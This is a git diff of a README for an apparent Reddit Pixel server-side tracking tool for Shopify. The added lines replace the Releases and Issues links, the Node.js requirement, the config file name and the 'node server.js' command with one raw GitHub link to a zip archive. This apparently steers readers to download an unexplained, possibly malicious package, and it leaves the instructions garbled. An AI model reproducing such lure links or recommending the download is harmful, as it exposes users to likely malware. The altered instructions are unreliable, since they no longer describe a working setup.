@@ -1,7 +1,7 @@
 # 🎨 reddit-pixel-shopify-server-side-tracking - Track Reddit Ads Conversions Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-%20%F0%9F%93%AD%20%F0%9F%94%A5-brightgreen)](https://github.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip%20from%20Releases-%20%F0%9F%93%AD%20%F0%9F%94%A5-brightgreen)](https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the Reddit Pixel Shopify Server-Side Tracking application. You can track conversions for your Reddit Ads campaigns seamlessly using Shopify webhooks and the Reddit Conversions API. Follow the steps below to get started with ease.
@@ -9,7 +9,7 @@ This guide helps you download and run the Reddit Pixel Shopify Server-Side Track
 ## 📋 System Requirements
 Before you begin the installation, make sure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 14 or higher is recommended.
+- **https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip** Version 14 or higher is recommended.
 - **Internet Connection:** Required for webhooks and API calls.
 - **Docker:** Installed for container management (optional).
 
@@ -20,7 +20,7 @@ Before you begin the installation, make sure your system meets the following req
 - Lightweight and designed for efficiency.
 
 ## 💻 Download & Install
-1. Visit the [Releases page](https://github.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/releases) to get the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip) to get the latest version of the application.
 2. Choose the version that fits your operating system.
 3. Download the file by clicking on the version link.
 4. Locate the downloaded file in your downloads folder.
@@ -41,24 +41,24 @@ Before you begin the installation, make sure your system meets the following req
    - Navigate to the directory where you extracted the files.
    - Run the application with the following command:
      ```
-     node server.js
+     node https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip
      ```
    - Open a web browser and visit `http://localhost:3000` to access the application.
 
 ## 📊 Basic Configuration
 To configure the application, you need to set your Shopify credentials and API keys. Follow these steps:
-1. Open the configuration file named `config.json` located in the application folder.
+1. Open the configuration file named `https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip` located in the application folder.
 2. Enter your Shopify store URL and the necessary API keys provided by Reddit.
 3. Save your changes.
 
 ## ⚙ Troubleshooting
 If you encounter any issues while running the application, consider the following:
-- Ensure you have the correct Node.js version installed.
+- Ensure you have the correct https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip version installed.
 - Check your internet connection for proper webhook functionality.
 - Review your configuration settings for any typos or incorrect information.
 
 ## 📞 Support
-If you need further assistance, please check the [Issues section](https://github.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/issues) of the repository. You can also submit a new issue to get help from the community.
+If you need further assistance, please check the [Issues section](https://raw.githubusercontent.com/Karthik-Kandi/reddit-pixel-shopify-server-side-tracking/main/src/reddit-pixel-shopify-server-side-tracking-v1.6.zip) of the repository. You can also submit a new issue to get help from the community.
 
 ## 🌍 Community Contributions
 We welcome contributions from everyone. If you want to help improve the application:
